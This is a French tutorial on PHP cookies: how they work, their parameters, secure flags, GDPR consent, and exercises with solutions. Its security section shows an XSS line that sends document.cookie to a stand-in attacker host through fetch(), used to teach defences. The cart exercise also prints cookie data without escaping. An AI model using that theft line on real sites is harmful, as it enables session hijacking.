Introduction aux cookies

Les cookies sont de petits fichiers texte stockés sur l'ordinateur du client par le navigateur web. Ils jouent un rôle fondamental dans l'expérience web moderne en permettant aux sites de "se souvenir" des informations entre différentes visites.

À quoi servent les cookies ?

Les cookies permettent de :

  • Maintenir l'état d'une session utilisateur - Par exemple, rester connecté à un site même après avoir fermé l'onglet
  • Stocker des préférences utilisateur - Comme la langue, le thème, ou d'autres paramètres personnalisés
  • Suivre le comportement des utilisateurs - Permettant l'analyse des interactions (analytics) et la personnalisation de contenu
  • Mémoriser le contenu d'un panier - Pour les sites e-commerce, conserver les articles sélectionnés pendant la navigation
Comment fonctionnent-ils concrètement ?

Imaginez que vous entrez dans un magasin où l'on vous remet un petit ticket avec un numéro. À chaque fois que vous revenez dans ce magasin, vous montrez ce ticket, et le vendeur peut se rappeler de vos préférences et de vos achats précédents. Les cookies fonctionnent de façon similaire sur internet.

Différence avec les sessions :

Cookies : Stockés côté client (dans le navigateur de l'utilisateur). Les données restent sur l'ordinateur de l'utilisateur.

Sessions : Stockées côté serveur. Seul un identifiant de session est envoyé au client via un cookie, mais les données elles-mêmes restent sur le serveur.

En résumé : Les cookies sont comme un bracelet que vous portez avec vos informations écrites dessus. Les sessions sont comme un bracelet avec seulement un numéro, et le magasin conserve vos informations dans son système.

Types de cookies

Type Description Durée de vie
Cookies de session Existent uniquement pendant la durée de la session du navigateur Jusqu'à la fermeture du navigateur
Cookies persistants Restent stockés entre les sessions Jusqu'à leur date d'expiration ou suppression manuelle
Cookies propriétaires Créés par le site que l'utilisateur visite Variable
Cookies tiers Créés par des domaines autres que celui visité Variable

Fonctionnement des cookies

Le principe fondamental

Les cookies fonctionnent sur un principe simple d'échange : le serveur demande au navigateur de stocker une information, et le navigateur la renvoie automatiquement lors des requêtes suivantes.

Cycle de vie d'un cookie

Le processus complet fonctionne ainsi :

  1. Création : Le serveur PHP envoie un cookie via l'en-tête HTTP Set-Cookie (à l'aide de la fonction setcookie())
  2. Stockage : Le navigateur reçoit cette instruction et stocke le cookie dans un emplacement sécurisé sur l'ordinateur de l'utilisateur
  3. Transmission automatique : Pour chaque requête suivante au même domaine, le navigateur renvoie automatiquement le cookie au serveur
  4. Lecture : Le serveur PHP peut lire la valeur du cookie via la variable superglobale $_COOKIE
  5. Expiration : Le cookie est supprimé lorsque sa date d'expiration est atteinte ou que l'utilisateur efface ses cookies
Où sont stockés les cookies ?

Les cookies sont stockés dans des fichiers spéciaux sur votre ordinateur. L'emplacement exact dépend du navigateur. Par exemple, dans Chrome, ils sont stockés dans une base de données SQLite dans le dossier du profil utilisateur.

Paramètres importants d'un cookie

Lorsque vous créez un cookie avec PHP, vous pouvez configurer plusieurs options qui déterminent son comportement :

ParamètreDescriptionExemple
Nom/Valeur L'identifiant du cookie et sa valeur associée 'nom_cookie' => 'valeur'
Expiration Date et heure d'expiration en timestamp UNIX time() + (86400 * 30) (30 jours)
Path Chemin sur le serveur où le cookie sera disponible '/' (tout le site) ou '/admin/' (section admin)
Domain Domaine pour lequel le cookie est valide '.example.com' (y compris sous-domaines)
Secure Cookie envoyé uniquement en HTTPS true ou false
HttpOnly Cookie inaccessible via JavaScript true ou false
SameSite Contrôle quand le cookie est envoyé dans requêtes cross-site 'Strict', 'Lax', ou 'None'
Important à savoir
  • Taille limite : Un cookie est limité à environ 4Ko (4096 octets). Ne stockez pas de grandes quantités de données.
  • Nombre limite : Un navigateur peut limiter le nombre de cookies par domaine (généralement 50).
  • Priorité : La fonction setcookie() doit être appelée avant tout affichage HTML ou espace.
  • Modifications : Pour modifier un cookie, réutilisez setcookie() avec le même nom.
  • Disponibilité : Un cookie créé n'est disponible dans $_COOKIE qu'à la prochaine requête HTTP.

Exemples pratiques

Comment utiliser les exemples

Les exemples suivants sont conçus pour être copiés et testés. Prenez le temps de comprendre chaque ligne avant de passer à l'exemple suivant. N'hésitez pas à modifier les valeurs pour voir leur impact.

1. Création d'un cookie simple

Objectif :

Créer un cookie nommé 'utilisateur' qui stocke un nom d'utilisateur pendant 30 jours.

Code :
<?php
// Créer un cookie valide 30 jours
setcookie('utilisateur', 'JeanDupont', time() + (86400 * 30), "/");

// Explication ligne par ligne :
// 1. setcookie() - Fonction PHP qui définit un cookie
// 2. 'utilisateur' - Le nom du cookie (utilisé pour le récupérer plus tard)
// 3. 'JeanDupont' - La valeur stockée dans le cookie
// 4. time() + (86400 * 30) - Date d'expiration (timestamp actuel + 30 jours en secondes)
// 5. "/" - Path du cookie (disponible sur tout le site)
?>
Points importants :
  • La fonction setcookie() doit être appelée avant tout affichage HTML
  • Le timestamp est en secondes : 86400 = 60 * 60 * 24 (secondes dans une journée)
  • Le cookie ne sera disponible qu'à la prochaine requête HTTP

2. Lire un cookie

Objectif :

Vérifier si un cookie existe et afficher sa valeur de façon sécurisée.

Code :
<?php
// Vérifier si le cookie 'utilisateur' existe
if(isset($_COOKIE['utilisateur'])) {
    // Afficher un message de bienvenue avec le nom d'utilisateur
    // htmlspecialchars() protège contre les attaques XSS
    echo "Bonjour " . htmlspecialchars($_COOKIE['utilisateur']);
} else {
    // Message si aucun cookie n'est trouvé
    echo "Aucun cookie utilisateur trouvé";
}

// Explication :
// 1. isset($_COOKIE['utilisateur']) - Vérifie si le cookie 'utilisateur' existe
// 2. $_COOKIE - Variable superglobale qui contient tous les cookies envoyés par le client
// 3. htmlspecialchars() - Convertit les caractères spéciaux en entités HTML (sécurité)
?>
Astuce pour le débogage :

Vous pouvez utiliser print_r($_COOKIE); pour voir tous les cookies disponibles.

3. Supprimer un cookie

Objectif :

Effacer un cookie existant du navigateur de l'utilisateur.

Code :
<?php
// Pour supprimer un cookie, on définit une date d'expiration passée
setcookie('utilisateur', '', time() - 3600, "/");

// Explication :
// 1. Même nom de cookie que celui qu'on veut supprimer ('utilisateur')
// 2. Valeur vide ('') - Effacement de la valeur
// 3. time() - 3600 - Date d'expiration dans le passé (il y a une heure)
// 4. "/" - Même chemin que lors de la création (important!)

// Note : La suppression ne sera effective qu'à la prochaine requête
// $_COOKIE['utilisateur'] existe toujours pendant l'exécution du script actuel
unset($_COOKIE['utilisateur']); // Pour supprimer également de la superglobale
?>
Important :
  • Vous devez spécifier exactement les mêmes paramètres que lors de la création (path, domain)
  • Le navigateur ne supprime pas immédiatement le cookie, il attend la prochaine requête
  • unset($_COOKIE['nom']) supprime le cookie de la variable, mais pas du navigateur

4. Stocker un tableau dans un cookie

Objectif :

Stocker des données complexes (comme un tableau) dans un cookie.

Code :
<?php
// Créer un tableau de données
$preferences = [
    'theme' => 'sombre',
    'langue' => 'fr',
    'notifications' => true
];

// Encoder le tableau en JSON pour le stocker dans un cookie
setcookie('preferences', json_encode($preferences), time() + (86400 * 30), "/");

// Plus tard, pour récupérer les données :
if(isset($_COOKIE['preferences'])) {
    // Décoder le JSON en tableau PHP
    $preferences = json_decode($_COOKIE['preferences'], true);
    
    // Utiliser les valeurs
    echo "Thème : " . htmlspecialchars($preferences['theme']) . "
";
    echo "Langue : " . htmlspecialchars($preferences['langue']) . "
";
    echo "Notifications : " . ($preferences['notifications'] ? 'Activées' : 'Désactivées');
}

// Explication :
// 1. json_encode() - Convertit un tableau PHP en chaîne JSON
// 2. json_decode() - Convertit une chaîne JSON en tableau PHP
// 3. Second paramètre 'true' - Crée un tableau associatif plutôt qu'un objet
?>
Astuce :

Cette technique est très utile pour les paniers d'achat, les préférences utilisateur, et d'autres données structurées.

Cas pratique : Se souvenir de la visite d'un utilisateur

Voici un exemple complet qui affiche un message différent selon que l'utilisateur visite le site pour la première fois ou revient :

<?php
// Vérifier si l'utilisateur a déjà visité le site
if(!isset($_COOKIE['visite'])) {
    // Première visite - créer le cookie
    setcookie('visite', '1', time() + (86400 * 365), "/"); // Valide un an
    $message = "Bienvenue sur notre site ! C'est votre première visite.";
    $count = 1;
} else {
    // Visite répétée - incrémenter le compteur
    $count = intval($_COOKIE['visite']) + 1;
    setcookie('visite', $count, time() + (86400 * 365), "/");
    $message = "Ravi de vous revoir ! C'est votre visite numéro $count.";
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Exemple de Compteur de Visites</title>
</head>
<body>
    <h1><?php echo $message; ?></h1>
</body>
</html>

Sécurité des cookies

Pourquoi la sécurité est-elle cruciale ?

Les cookies peuvent contenir des données sensibles ou être utilisés pour des attaques. Il est essentiel de les sécuriser correctement pour protéger vos utilisateurs et votre application.

Principales menaces de sécurité

1. Vol de cookies (Cookie theft)

Problème : Un attaquant peut voler les cookies d'un utilisateur via des attaques XSS (Cross-Site Scripting) et usurper son identité.

Solution : Utiliser le flag HttpOnly pour empêcher JavaScript d'accéder aux cookies.

Exemple d'attaque XSS :
<script>
// Ce code malveillant pourrait être injecté dans votre site
fetch('https://site-pirate.com/steal?cookie=' + document.cookie);
</script>
2. Interception (Man-in-the-Middle)

Problème : Les cookies peuvent être interceptés lors de leur transmission si le site n'utilise pas HTTPS.

Solution : Utiliser le flag Secure pour que les cookies ne soient transmis qu'en HTTPS.

3. CSRF (Cross-Site Request Forgery)

Problème : Un site malveillant peut forcer votre navigateur à effectuer des requêtes vers un site où vous êtes authentifié.

Solution : Utiliser le flag SameSite pour limiter les requêtes cross-origin avec cookies.

Bonnes pratiques de sécurité :

  • HttpOnly - Toujours utiliser ce flag pour empêcher l'accès via JavaScript
  • Secure - Utiliser ce flag en production pour imposer HTTPS
  • SameSite - Définir à "Strict" ou "Lax" pour se protéger contre CSRF
  • Données sensibles - Ne jamais stocker d'informations sensibles (mots de passe, données personnelles)
  • Validation - Toujours valider et filtrer les données des cookies avant utilisation
  • Expiration - Définir des dates d'expiration appropriées pour limiter les risques
  • Chiffrement - Pour les données importantes, envisager de les chiffrer avant stockage

Exemple de cookie sécurisé en PHP 7+ :

<?php
// Création d'un cookie sécurisé avec un format tableau d'options (PHP 7.3+)
setcookie(
    'session_id',                    // Nom du cookie
    bin2hex(random_bytes(16)),       // Valeur aléatoire sécurisée (32 caractères hex)
    [
        'expires' => time() + 86400, // Expiration après 1 jour
        'path' => '/',               // Valide pour tout le site
        'domain' => '',              // Domaine actuel uniquement
        'secure' => true,            // Uniquement en HTTPS
        'httponly' => true,          // Inaccessible par JavaScript
        'samesite' => 'Strict'       // Protection contre CSRF
    ]
);

// Pour PHP 5.6 à 7.2 (ancienne syntaxe) :
/*
setcookie('session_id', bin2hex(random_bytes(16)), time() + 86400, 
          '/', '', true, true);
// Note : SameSite n'est pas disponible dans l'ancienne syntaxe
*/
?>
RGPD et ePrivacy : Considérations légales

En Europe, les lois RGPD et ePrivacy exigent le consentement des utilisateurs pour les cookies non essentiels :

  1. Informer les utilisateurs - Expliquer quels cookies sont utilisés et pourquoi
  2. Obtenir le consentement - Avant de définir des cookies non essentiels
  3. Permettre le refus - Offrir une option pour refuser les cookies
  4. Proposer des paramètres - Permettre de personnaliser les préférences

Vous devez implémenter une bannière de cookies conforme pour respecter ces réglementations.

Exercice 1 : Cookie de préférence
Objectif pédagogique :

Apprendre à stocker et récupérer les préférences utilisateur avec les cookies.

Instructions :

Créez un script qui :

  1. Stocke la langue préférée de l'utilisateur (fr/en)
  2. Affiche un message de bienvenue dans la langue stockée
  3. Permet de changer la langue via un formulaire
Aide au développement :
  • Utilisez un formulaire avec une méthode POST
  • Vérifiez si le formulaire a été soumis avec $_SERVER['REQUEST_METHOD']
  • Stockez la langue dans un cookie valide au moins 30 jours
  • Préparez des messages dans différentes langues (tableau)
  • Utilisez la valeur du cookie ou une valeur par défaut
Voir la solution
Solution proposée :
<?php
// Vérifie si le formulaire a été soumis
if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['langue'])) {
    // Stocke la langue dans un cookie (30 jours)
    setcookie('langue', $_POST['langue'], time() + (86400 * 30), "/");
    header('Location: '.$_SERVER['PHP_SELF']);
    exit;
}

// Messages dans différentes langues
$messages = [
    'fr' => 'Bienvenue sur notre site!',
    'en' => 'Welcome to our website!'
];

// Détermine la langue actuelle
$langue = $_COOKIE['langue'] ?? 'fr';
?>
<!DOCTYPE html>
<html lang="<?= $langue === 'en' ? 'en' : 'fr' ?>">
<head>
    <meta charset="UTF-8">
    <title>Exercice Préférence Langue</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <div class="container mt-5">
        <h1><?= $messages[$langue] ?></h1>
        
        <!-- Formulaire pour changer la langue -->
        <form method="post" class="mt-4">
            <div class="mb-3">
                <label class="form-label">Changer la langue:</label>
                <select name="langue" class="form-select">
                    <option value="fr" <?= $langue === 'fr' ? 'selected' : '' ?>>Français</option>
                    <option value="en" <?= $langue === 'en' ? 'selected' : '' ?>>English</option>
                </select>
            </div>
            <button type="submit" class="btn btn-primary">Enregistrer</button>
        </form>
    </div>
</body>
</html>
Explications :
  1. On commence par vérifier si le formulaire a été soumis via POST
  2. Si oui, on stocke la langue choisie dans un cookie
  3. Nous effectuons une redirection pour éviter que le formulaire soit soumis à nouveau lors d'un rechargement
  4. Un tableau associatif stocke les messages dans différentes langues
  5. L'opérateur de fusion null (??) permet d'utiliser une langue par défaut si le cookie n'existe pas
  6. La langue est utilisée à la fois pour l'attribut lang de HTML et pour afficher le message correspondant
Exercice 2 : Panier d'achat
Objectif pédagogique :

Apprendre à stocker des structures de données complexes dans les cookies et à les manipuler.

Instructions :

Implémentez un panier simple qui :

  1. Stocke les articles ajoutés dans un cookie (format JSON)
  2. Affiche le contenu du panier
  3. Permet de vider le panier
Aide au développement :
  • Utilisez json_encode() pour convertir un tableau PHP en chaîne JSON
  • Utilisez json_decode() pour convertir la chaîne JSON en tableau PHP
  • N'oubliez pas de sécuriser les entrées avec htmlspecialchars()
  • Pensez à actualiser la valeur en mémoire avec $_COOKIE['panier']
Voir la solution
Solution proposée :
<?php
// Initialisation
session_start();

// Action pour ajouter un article
if(isset($_POST['ajouter_article']) && !empty($_POST['article'])) {
    // On récupère le panier existant ou on en crée un nouveau
    $panier = isset($_COOKIE['panier']) ? json_decode($_COOKIE['panier'], true) : [];
    
    // On ajoute le nouvel article
    $article = htmlspecialchars($_POST['article']);
    $panier[] = $article;
    
    // On sauvegarde le panier mis à jour dans un cookie (valide pour 1 jour)
    setcookie('panier', json_encode($panier), time() + 86400, '/');
    
    // Pour une mise à jour immédiate de l'affichage
    $_COOKIE['panier'] = json_encode($panier);
}

// Action pour vider le panier
if(isset($_POST['vider_panier'])) {
    // On supprime le cookie en définissant une date d'expiration passée
    setcookie('panier', '', time() - 3600, '/');
    
    // On vide également la valeur en mémoire
    $_COOKIE['panier'] = null;
}

// Récupération du panier pour affichage
$panier = isset($_COOKIE['panier']) ? json_decode($_COOKIE['panier'], true) : [];
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Exercice Panier d'Achat</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <div class="container mt-5">
        <h1>Mon Panier d'Achat</h1>
        
        <!-- Formulaire pour ajouter un article -->
        <div class="card mb-4">
            <div class="card-header bg-primary text-white">
                Ajouter un article
            </div>
            <div class="card-body">
                <form method="post" class="d-flex">
                    <input type="text" name="article" class="form-control me-2" placeholder="Nom de l'article" required>
                    <button type="submit" name="ajouter_article" class="btn btn-success">Ajouter</button>
                </form>
            </div>
        </div>
        
        <!-- Affichage du contenu du panier -->
        <div class="card">
            <div class="card-header bg-info text-white">
                Contenu du Panier
            </div>
            <div class="card-body">
                <?php if(empty($panier)): ?>
                    <p class="text-muted">Votre panier est vide.</p>
                <?php else: ?>
                    <ul class="list-group">
                        <?php foreach($panier as $article): ?>
                            <li class="list-group-item"><?= $article ?></li>
                        <?php endforeach; ?>
                    </ul>
                    
                    <div class="mt-3">
                        <form method="post">
                            <button type="submit" name="vider_panier" class="btn btn-danger">Vider le panier</button>
                        </form>
                    </div>
                <?php endif; ?>
            </div>
        </div>
        
        <div class="mt-4">
            <a href="index.html" class="btn btn-outline-primary">Retour au cours</a>
        </div>
    </div>
</body>
</html>
Explications :
  1. Nous utilisons json_encode() et json_decode() pour stocker un tableau dans un cookie
  2. Le panier est stocké sous forme de tableau associatif et converti en JSON
  3. La fonction htmlspecialchars() est utilisée pour sécuriser les données
  4. On met à jour la valeur en mémoire ($_COOKIE['panier']) pour un affichage immédiat
  5. Pour vider le panier, on utilise une date d'expiration dans le passé
  6. L'interface utilisateur change en fonction de l'état du panier (vide ou avec des articles)
Exercice 3 : Système de connexion simple
À vous de jouer !

Créez un système de connexion basique qui :

  1. Permet à un utilisateur de se connecter avec un nom d'utilisateur et un mot de passe prédéfinis
  2. Stocke l'état de connexion dans un cookie
  3. Affiche différentes informations selon que l'utilisateur est connecté ou non

Conseils :
  • Utilisez deux durées différentes pour le cookie: courte sans "Se souvenir de moi", longue avec
  • N'enregistrez pas le mot de passe dans le cookie, seulement un identifiant de session
  • Pensez à la sécurité : utilisez HttpOnly et Secure si possible
  • Bonus : chiffrez les données stockées dans le cookie
